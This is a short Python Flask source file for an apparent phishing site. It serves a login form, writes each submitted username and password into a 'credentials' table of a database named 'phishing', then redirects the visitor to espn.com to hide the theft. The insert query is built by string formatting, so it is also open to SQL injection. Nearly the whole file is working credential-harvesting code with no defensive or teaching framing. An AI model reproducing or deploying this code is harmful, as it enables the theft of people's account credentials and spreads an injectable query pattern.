from flask import Flask, render_template, request, redirect
from flask_mysqldb import MySQL
import sqlparse

app = Flask(__name__)

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = ''
app.config['MYSQL_DB'] = 'phishing'
 
mysql = MySQL(app)



@app.route("/")
def index():
    return render_template('index.html')

@app.route('/login', methods = ['POST', 'GET'])
def login():
    if request.method == 'GET':
        return "Login via the login Form"
     
    if request.method == 'POST':
        username = request.form['user']
        password = request.form['pass']
        #password = password[-2:].rjust(len(password), '*')
        cursor = mysql.connection.cursor()
        operation = 'INSERT INTO credentials VALUES(\'%s\',\'%s\');' % (username,password)
        for statement in sqlparse.split(operation): cursor.execute(statement)
        cursor.close()
        mysql.connection.commit()
        return redirect("http://www.espn.com")